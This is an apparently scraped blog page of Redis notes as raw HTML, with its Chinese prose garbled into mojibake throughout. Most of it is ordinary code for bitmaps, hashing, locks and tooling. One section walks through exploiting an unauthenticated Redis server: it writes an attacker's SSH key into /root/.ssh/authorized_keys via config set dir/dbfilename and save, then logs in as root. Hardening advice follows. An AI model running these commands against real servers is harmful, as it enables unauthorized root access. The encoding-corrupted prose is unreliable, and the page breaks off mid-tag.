class="string">'login:20190311'</span>, <span class="string">'login:20190312'</span>, <span class="string">'login:20190313'</span>);</span><br><span class="line">echo <span class="string">"è¿ç»­ä¸‰å¤©éƒ½ç­¾åˆ°çš„ç”¨æˆ·æ•°é‡ï¼š"</span> . $redis-&gt;bitCount(<span class="string">'threeAnd'</span>);</span><br><span class="line"></span><br><span class="line">$redis-&gt;bitop(<span class="string">'OR'</span>, <span class="string">'threeOr'</span>, <span class="string">'login:20190311'</span>, <span class="string">'login:20190312'</span>, <span class="string">'login:20190313'</span>);</span><br><span class="line">echo <span class="string">"ä¸‰å¤©ä¸­ç­¾åˆ°ç”¨æˆ·æ•°é‡ï¼ˆæœ‰ä¸€å¤©ç­¾ä¹Ÿç®—ç­¾äº†ï¼‰ï¼š"</span> . $redis-&gt;bitCount(<span class="string">'threeOr'</span>);</span><br><span class="line"></span><br><span class="line">$redis-&gt;bitop(<span class="string">'AND'</span>, <span class="string">'monthActivities'</span><span class="string">', $redis-&gt;keys('</span>login:<span class="number">201903</span>*<span class="string">'));</span></span><br><span class="line"><span class="string">echo "è¿ç»­ä¸€ä¸ªæœˆç­¾åˆ°ç”¨æˆ·æ•°é‡ï¼š" . $redis-&gt;bitCount('</span>monthActivities<span class="string">');</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo "å½“å‰ç”¨æˆ·æŒ‡å®šå¤©æ•°æ˜¯å¦ç­¾åˆ°ï¼š" . $redis-&gt;getbit('</span>login:<span class="number">20190311</span><span class="string">', $this-&gt;user-&gt;id);</span></span><br><span class="line"><span class="string">https://learnku.com/articles/25181</span></span><br><span class="line"><span class="string">$redis-&gt;scan(0, '</span>match<span class="string">', '</span>login:<span class="number">201903</span>*<span class="string">', '</span>count<span class="string">', 1000))</span></span><br><span class="line"><span class="string">COUNT å‚æ•°çš„é»˜è®¤å€¼ä¸º 10 ï¼Œå¦‚æœä¸æ˜¯ 0 ï¼Œä½ å†ä½¿ç”¨ scan 3 match login:201903* ç»§ç»­éå†ã€‚</span></span><br></pre></td></tr></table></figure>
<h3 id="Redis-åˆ†å¸ƒå¼å­˜å‚¨"><a href="#Redis-åˆ†å¸ƒå¼å­˜å‚¨" class="headerlink" title="Redis åˆ†å¸ƒå¼å­˜å‚¨"></a>Redis åˆ†å¸ƒå¼å­˜å‚¨</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RedisCluster</span> </span>&#123;</span><br><span class="line">    public $servers = array();</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">addServer</span>(<span class="params">$host, $port</span>) </span>&#123;</span><br><span class="line">        $redis = <span class="keyword">new</span> Redis();</span><br><span class="line">        $redis-&gt;_connected = <span class="literal">false</span>;</span><br><span class="line">        $redis-&gt;_host = $host;</span><br><span class="line">        $redis-&gt;_port = $port;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;servers[] = $redis;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$method, $args</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!method_exists(<span class="string">"Redis"</span>, $method)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Execption(<span class="string">"not method"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $redis = $<span class="keyword">this</span>-&gt;servers[abs(crc32($args[<span class="number">0</span>])) % count($<span class="keyword">this</span>-&gt;servers)];</span><br><span class="line">        <span class="keyword">if</span> (!$redis-&gt;_connected) &#123;</span><br><span class="line">            $redis-&gt;connect($redis-&gt;_host, $redis-&gt;_port);</span><br><span class="line">            $redis-&gt;_connected = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// return $redis-&gt;$method(...$args); // PHP 5.6</span></span><br><span class="line">        <span class="keyword">return</span> call_user_func_array([$redis, $method], $args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$rc = <span class="keyword">new</span> RedisCluster();</span><br><span class="line">$rc-&gt;addServer(<span class="string">"127.0.0.1"</span>, <span class="number">8000</span>);</span><br><span class="line">$rc-&gt;addServer(<span class="string">"127.0.0.1"</span>, <span class="number">8001</span>);</span><br><span class="line">https:<span class="comment">//learnku.com/articles/32153</span></span><br><span class="line">$rc-&gt;set(<span class="string">"a"</span>, <span class="number">1</span>);</span><br><span class="line">$rc-&gt;set(<span class="string">"b"</span>, <span class="number">2</span>);</span><br><span class="line">$rc-&gt;set(<span class="string">"c"</span>, <span class="number">3</span>);</span><br><span class="line">$rc-&gt;set(<span class="string">"d"</span>, <span class="number">4</span>);</span><br><span class="line">$rc-&gt;set(<span class="string">"e"</span>, <span class="number">5</span>);</span><br></pre></td></tr></table></figure>
<h3 id="è·å–å¤§-key"><a href="#è·å–å¤§-key" class="headerlink" title="è·å–å¤§ key"></a>è·å–å¤§ key</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -p <span class="number">7001</span> â€“-bigkeys ä¹Ÿå¯ä»¥è¿½åŠ ä¸€ä¸ªä¼‘çœ å‚æ•°ï¼Œé˜²æ­¢åœ¨æŸ¥è¯¢è¿‡ç¨‹ ops æš´å¢ï¼Œä½¿ç”¨æ­¤å‘½ä»¤ï¼šredis-cli -h <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -p <span class="number">7001</span>â€“-bigkeys -i <span class="number">0.1</span></span><br><span class="line">https:<span class="comment">//github.com/leonchen83/redis-rdb-cli</span></span><br></pre></td></tr></table></figure>
<h3 id="redisé”"><a href="#redisé”" class="headerlink" title="redisé”"></a>redisé”</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¦‚æœè·å–åˆ°é”ï¼Œåˆ™æ‰§è¡Œ $callback å›è°ƒ</span></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$callback = null</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $result = $<span class="keyword">this</span>-&gt;acquire();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($result &amp;&amp; is_callable($callback)) &#123;</span><br><span class="line">        <span class="keyword">return</span> tap($callback(), <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;release();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¦‚æœè·å–åˆ°é”ï¼Œåˆ™æ‰§è¡Œ $callback å›è°ƒ</span></span><br><span class="line"><span class="comment">// å¦‚æœæ²¡æœ‰è·å–åˆ°é”ï¼Œä¼šç­‰å¾…250æ¯«ç§’ï¼Œç»§ç»­å»è·å–é”</span></span><br><span class="line"><span class="comment">// å¦‚æœåœ¨ $seconds ç§’ä¹‹å†…è¿˜æ²¡æœ‰è·å–åˆ°é”ï¼Œä¼šæŠ›å‡º LockTimeoutException å¼‚å¸¸</span></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">block</span>(<span class="params">$seconds, $callback = null</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $starting = $<span class="keyword">this</span>-&gt;currentTime();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (! $<span class="keyword">this</span>-&gt;acquire()) &#123;</span><br><span class="line">        usleep(<span class="number">250</span> * <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($<span class="keyword">this</span>-&gt;currentTime() - $seconds &gt;= $starting) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> LockTimeoutException;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_callable($callback)) &#123;</span><br><span class="line">        <span class="keyword">return</span> tap($callback(), <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;release();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RedisLock</span> <span class="keyword">extends</span> <span class="title">Lock</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The Redis factory implementation.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @var \Illuminate\Redis\Connections\Connection</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    protected $redis;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a new lock instance.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param  \Illuminate\Redis\Connections\Connection  $redis</span></span><br><span class="line"><span class="comment">     * @param  string  $name</span></span><br><span class="line"><span class="comment">     * @param  int  $seconds</span></span><br><span class="line"><span class="comment">     * @return void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$redis, $name, $seconds</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        parent::__construct($name, $seconds);</span><br><span class="line"></span><br><span class="line">        $<span class="keyword">this</span>-&gt;redis = $redis;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Attempt to acquire the lock.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @return bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">acquire</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $result = $<span class="keyword">this</span>-&gt;redis-&gt;setnx($<span class="keyword">this</span>-&gt;name, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($result === <span class="number">1</span> &amp;&amp; $<span class="keyword">this</span>-&gt;seconds &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;redis-&gt;expire($<span class="keyword">this</span>-&gt;name, $<span class="keyword">this</span>-&gt;seconds);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $result === <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Release the lock.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @return void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">release</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;redis-&gt;del($<span class="keyword">this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/33111</span></span><br></pre></td></tr></table></figure>
<h3 id="Redis-æœªæˆæƒè®¿é—®é…åˆ"><a href="#Redis-æœªæˆæƒè®¿é—®é…åˆ" class="headerlink" title="Redis æœªæˆæƒè®¿é—®é…åˆ"></a>Redis æœªæˆæƒè®¿é—®é…åˆ</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">éƒ¨åˆ† Redis ç»‘å®šåœ¨ <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">6379</span>ï¼Œå¹¶ä¸”æ²¡æœ‰å¼€å¯è®¤è¯ï¼ˆè¿™æ˜¯Redis çš„é»˜è®¤é…ç½®ï¼‰ï¼Œå¦‚æœæ²¡æœ‰è¿›è¡Œé‡‡ç”¨ç›¸å…³çš„ç­–ç•¥ï¼Œæ¯”å¦‚æ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æº ip è®¿é—®ç­‰ï¼Œå°†ä¼šå¯¼è‡´ Redis æœåŠ¡ç›´æ¥æš´éœ²åœ¨å…¬ç½‘ä¸Šï¼Œå¯¼è‡´å…¶ä»–ç”¨æˆ·å¯ä»¥ç›´æ¥åœ¨éæˆæƒæƒ…å†µä¸‹ç›´æ¥è®¿é—®RedisæœåŠ¡å¹¶è¿›è¡Œç›¸å…³æ“ä½œã€‚</span><br><span class="line">åˆ©ç”¨ Redis è‡ªèº«çš„æä¾›çš„ config å‘½ä»¤ï¼Œå¯ä»¥è¿›è¡Œå†™æ–‡ä»¶æ“ä½œï¼Œæ”»å‡»è€…å¯ä»¥æˆåŠŸå°†è‡ªå·±çš„å…¬é’¥å†™å…¥ç›®æ ‡æœåŠ¡å™¨çš„ /root/.ssh æ–‡ä»¶å¤¹çš„authotrized_keys æ–‡ä»¶ä¸­ï¼Œè¿›è€Œå¯ä»¥ç›´æ¥ä½¿ç”¨å¯¹åº”çš„ç§é’¥ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚</span><br><span class="line"></span><br><span class="line">Redis æš´éœ²åœ¨å…¬ç½‘ï¼ˆå³ç»‘å®šåœ¨<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">6379</span>ï¼Œç›®æ ‡IPå…¬ç½‘å¯è®¿é—®ï¼‰ï¼Œå¹¶ä¸”æ²¡æœ‰å¼€å¯ç›¸å…³è®¤è¯å’Œæ·»åŠ ç›¸å…³å®‰å…¨ç­–ç•¥æƒ…å†µä¸‹å¯å—å½±å“è€Œå¯¼è‡´è¢«åˆ©ç”¨ã€‚</span><br><span class="line">ssh-keygen â€“t rsa</span><br><span class="line">å°†å…¬é’¥å†™å…¥ foo.txt æ–‡ä»¶</span><br><span class="line">$ (echo -e <span class="string">"\n\n"</span>; cat id_rsa.pub; echo -e <span class="string">"\n\n"</span>) &gt; foo.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ cat foo.txt | redis-cli -h <span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span> -x set crackit</span><br><span class="line"> </span><br><span class="line">$ redis-cli -h <span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span></span><br><span class="line"> </span><br><span class="line">$ <span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span>:<span class="number">6379</span>&gt; config set dir /root/.ssh/</span><br><span class="line"> </span><br><span class="line">OK</span><br><span class="line"> </span><br><span class="line">$ <span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span>:<span class="number">6379</span>&gt; config get dir</span><br><span class="line"> </span><br><span class="line"><span class="number">1</span>) <span class="string">"dir"</span></span><br><span class="line"> </span><br><span class="line"><span class="number">2</span>) <span class="string">"/root/.ssh"</span></span><br><span class="line"> </span><br><span class="line">$ <span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span>:<span class="number">6379</span>&gt; config set dbfilename <span class="string">"authorized_keys"</span></span><br><span class="line"> </span><br><span class="line">OK</span><br><span class="line"> </span><br><span class="line">$ <span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span>:<span class="number">6379</span>&gt; save</span><br><span class="line"> </span><br><span class="line">OK</span><br><span class="line">è¿™æ ·å°±å¯ä»¥æˆåŠŸçš„å°†è‡ªå·±çš„å…¬é’¥å†™å…¥ /root/.ssh æ–‡ä»¶å¤¹çš„ authotrized_keys æ–‡ä»¶é‡Œï¼Œç„¶åæ”»å‡»è€…ç›´æ¥æ‰§è¡Œï¼š</span><br><span class="line"> </span><br><span class="line">$ ssh â€“i  id_rsa root@<span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span></span><br><span class="line">å³å¯è¿œç¨‹åˆ©ç”¨è‡ªå·±çš„ç§é’¥ç™»å½•è¯¥æœåŠ¡å™¨ã€‚</span><br><span class="line">å½“ç„¶ï¼Œå†™å…¥çš„ç›®å½•ä¸é™äº /root/.ssh ä¸‹çš„authorized_keysï¼Œä¹Ÿå¯ä»¥å†™å…¥ç”¨æˆ·ç›®å½•ï¼Œä¸è¿‡ Redis å¾ˆå¤šä»¥ root æƒé™è¿è¡Œï¼Œæ‰€ä»¥å†™å…¥ root ç›®å½•ä¸‹ï¼Œå¯ä»¥è·³è¿‡çŒœç”¨æˆ·çš„æ­¥éª¤ã€‚</span><br><span class="line">å¯ä»¥ä½¿ç”¨Pocsuiteï¼ˆhttp:<span class="comment">//github.com/knownsec/pocsuiteï¼‰æ‰§è¡Œä»¥ä¸‹çš„ä»£ç å¯ä»¥ç”¨äºæµ‹è¯•ç›®æ ‡åœ°å€æ˜¯å¦å­˜åœ¨æœªæˆæƒçš„RedisæœåŠ¡ã€‚</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//www.waitalone.cn/redis-unauthorized-of-expolit.html </span></span><br><span class="line">é…ç½®bindé€‰é¡¹ï¼Œé™å®šå¯ä»¥è¿æ¥RedisæœåŠ¡å™¨çš„IPï¼Œä¿®æ”¹ Redis çš„é»˜è®¤ç«¯å£<span class="number">6379</span></span><br><span class="line">é…ç½®è®¤è¯ï¼Œä¹Ÿå°±æ˜¯AUTHï¼Œè®¾ç½®å¯†ç ï¼Œå¯†ç ä¼šä»¥æ˜æ–‡æ–¹å¼ä¿å­˜åœ¨Redisé…ç½®æ–‡ä»¶ä¸­</span><br><span class="line">é…ç½®rename-command é…ç½®é¡¹ â€œRENAME_CONFIGâ€ï¼Œè¿™æ ·å³ä½¿å­˜åœ¨æœªæˆæƒè®¿é—®ï¼Œä¹Ÿèƒ½å¤Ÿç»™æ”»å‡»è€…ä½¿ç”¨config æŒ‡ä»¤åŠ å¤§éš¾åº¦</span><br><span class="line">å¥½æ¶ˆæ¯æ˜¯Redisä½œè€…è¡¨ç¤ºå°†ä¼šå¼€å‘â€real userâ€ï¼ŒåŒºåˆ†æ™®é€šç”¨æˆ·å’Œadminæƒé™ï¼Œæ™®é€šç”¨æˆ·å°†ä¼šè¢«ç¦æ­¢è¿è¡ŒæŸäº›å‘½ä»¤ï¼Œå¦‚config</span><br></pre></td></tr></table></figure>
<h3 id="Redis-æŸ¥çœ‹æ‰€æœ‰-key-çš„-value-å€¼æ‰€å å†…å­˜å¤§å°"><a href="#Redis-æŸ¥çœ‹æ‰€æœ‰-key-çš„-value-å€¼æ‰€å å†…å­˜å¤§å°" class="headerlink" title="Redis æŸ¥çœ‹æ‰€æœ‰ key çš„ value å€¼æ‰€å å†…å­˜å¤§å°"></a>Redis æŸ¥çœ‹æ‰€æœ‰ key çš„ value å€¼æ‰€å å†…å­˜å¤§å°</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/sripathikrishnan/redis-rdb-tools#generate-memory-report</span></span><br><span class="line">$ pip install rdbtools python-lzf</span><br><span class="line">$ git clone https:<span class="comment">//github.com/sripathikrishnan/redis-rdb-tools</span></span><br><span class="line">$ cd redis-rdb-tools</span><br><span class="line">$ sudo python setup.py install</span><br><span class="line"></span><br><span class="line">æ¥ä¸‹æ¥æ‰¾åˆ° redis çš„ dump.rdb ä½ç½®</span><br><span class="line"></span><br><span class="line">é¦–å…ˆå®šä½åˆ° redis.conf ä½ç½®</span><br><span class="line"></span><br><span class="line">$ whereis redis.conf</span><br><span class="line">redis: <span class="regexp">/etc/</span>redis.conf</span><br><span class="line">$ cat /etc/redis.conf | grep dir | grep redis</span><br><span class="line">dir /<span class="keyword">var</span>/lib/redis</span><br><span class="line">$ cat /etc/redis.conf | grep dump.rdb</span><br><span class="line">dbfilename dump.rdb</span><br><span class="line">ç»¼ä¸Šï¼Œå¾—çŸ¥å…¶è·¯å¾„ä¸ºï¼š/<span class="keyword">var</span>/lib/redis/dump.rdb</span><br><span class="line"></span><br><span class="line">æŒ‰å†…å­˜å€¼å¯¼å‡º csv</span><br><span class="line"></span><br><span class="line">$ rdb -c memory /<span class="keyword">var</span>/lib/redis/dump.rdb &gt; <span class="regexp">/tmp/</span>redis.csv</span><br><span class="line">https:<span class="comment">//learnku.com/articles/33211</span></span><br></pre></td></tr></table></figure>
<h3 id="ç®¡ç†å¹³å°å·¥å…·-RedisManager"><a href="#ç®¡ç†å¹³å°å·¥å…·-RedisManager" class="headerlink" title="ç®¡ç†å¹³å°å·¥å…· RedisManager"></a>ç®¡ç†å¹³å°å·¥å…· RedisManager</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">githubé¡¹ç›®åœ°å€ï¼šhttps:<span class="comment">//github.com/ngbdf/redis-manager</span></span><br><span class="line"></span><br><span class="line">ä¸‹è½½å®‰è£…ï¼š</span><br><span class="line">ç³»ç»Ÿç¯å¢ƒï¼š</span><br><span class="line">LINUX</span><br><span class="line">JDK1<span class="number">.8</span></span><br><span class="line"></span><br><span class="line">#Releases</span><br><span class="line">https:<span class="comment">//github.com/ngbdf/redis-manager/releases</span></span><br><span class="line"></span><br><span class="line">#å½“å‰æœ€æ–°ç‰ˆæœ¬ 1.1</span><br><span class="line">wget https:<span class="comment">//github.com/ngbdf/redis-manager/releases/download/redismanager-1.1-release/redis-manager-1.1-release.tar.gz</span></span><br><span class="line"></span><br><span class="line">#åˆ›å»ºæ•°æ®åº“</span><br><span class="line">create database dbname <span class="keyword">default</span> character set utf8mb4 collate utf8mb4_general_ci;</span><br><span class="line"></span><br><span class="line">#è§£å‹</span><br><span class="line">tar xf redis-manager<span class="number">-1.1</span>-release.tar.gz </span><br><span class="line">cd redis-manager<span class="number">-1.1</span>/</span><br><span class="line"></span><br><span class="line">#ä¿®æ”¹é…ç½®æ–‡ä»¶</span><br><span class="line">cd conf/</span><br><span class="line">vim application.yml</span><br><span class="line"></span><br><span class="line">#ç«¯å£å·</span><br><span class="line">server:</span><br><span class="line">  tomcat.uri-encoding: UTF<span class="number">-8</span></span><br><span class="line">  port: <span class="number">8182</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#æ•°æ®åº“ï¼Œä»…éœ€è‡ªå·±åˆ›å»ºæ•°æ®åº“å³å¯ï¼Œç›¸å…³è¡¨ä¼šè‡ªåŠ¨ç”Ÿæˆ</span><br><span class="line">  datasource:</span><br><span class="line">      name: dbname</span><br><span class="line">      driver-class-name: com.mysql.jdbc.Driver</span><br><span class="line">      url: jdbc:mysql:<span class="comment">//192.168.1.1:3306/dbname?useUnicode=true&amp;characterEncoding=utf-8</span></span><br><span class="line">      username: user</span><br><span class="line">      password: passwd</span><br><span class="line"></span><br><span class="line">å¯åŠ¨è®¿é—®ï¼š</span><br><span class="line">#æ‰§è¡Œbinç›®å½•ä¸‹çš„start.shè„šæœ¬</span><br><span class="line">./bin/start.sh </span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹è¿›ç¨‹</span><br><span class="line">ps -ef |grep java</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹ç«¯å£</span><br><span class="line">netstat -lntp |grep <span class="number">8182</span></span><br><span class="line">tcp6       <span class="number">0</span>      <span class="number">0</span> :::<span class="number">8182</span>                 :::*                    LISTEN      <span class="number">7774</span>/java   </span><br><span class="line">https:<span class="comment">//me.jinchuang.org/archives/430.html</span></span><br></pre></td></tr></table></figure>
<h3 id="Redisç›‘æ§å·¥å…·-redis-stat"><a href="#Redisç›‘æ§å·¥å…·-redis-stat" class="headerlink" title="Redisç›‘æ§å·¥å…· redis-stat"></a>Redisç›‘æ§å·¥å…· redis-stat</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">https:<span 